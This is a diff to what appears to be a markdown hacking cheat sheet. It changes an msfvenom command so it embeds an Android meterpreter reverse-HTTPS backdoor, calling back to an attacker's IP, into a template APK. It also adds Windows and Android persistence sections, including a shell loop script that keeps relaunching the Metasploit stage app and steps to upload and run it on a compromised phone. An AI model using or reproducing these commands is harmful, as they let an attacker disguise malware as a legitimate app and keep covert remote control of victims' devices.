@@ -416,7 +416,7 @@ Check if your backdoor is being detected by anti-virus by going to
 
 #### Generate a backdoor for Android
 
-`msfvenom -p android/meterpreter/[payload type(reverse_https)] LHOST=[attacker's IP] LPORT=[port] -o [file name.apk]`
+* `msfvenom -x [template.apk] -p android/meterpreter/[payload type(reverse_https)] LHOST=[attacker's IP] LPORT=[port] -o [file name.apk]`
 
 ### Listen for incomming connections
 
@@ -547,6 +547,8 @@ When you hack into a device, it is a good idea to migrate the original process t
 
 ### Maintaining Access
 
+#### Windows
+
 * Method 1 - Using Veil
   * Instead of using `rev_http_service` module use `reverse_tcp_service` module.
   * But it does not always work.
@@ -564,6 +566,29 @@ When you hack into a device, it is a good idea to migrate the original process t
   * `set EXE::Custom [payload path]`
   * `exploit`
   * Now you just have to listen for incoming connections and a session will be opened.
+
+#### Android
+
+* Save this code as "persist.sh".
+
+```
+#!/bin/sh
+while :
+do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
+sleep 10
+done
+```
+* If the device is rooted
+  * `cd /etc/init.d`
+* If the device is not rooted
+  * `cd /storage`
+* `upload persist.sh`
+* `shell`
+* `cd /storage`
+* `sh persist.sh`
+
+* If the device is not rooted the persistance of the backdoor will remain until a reboot of the android system.
+* If the backdoor is closed the session is closed and the app must be iniciated again.
  
 ### Pivoting
 
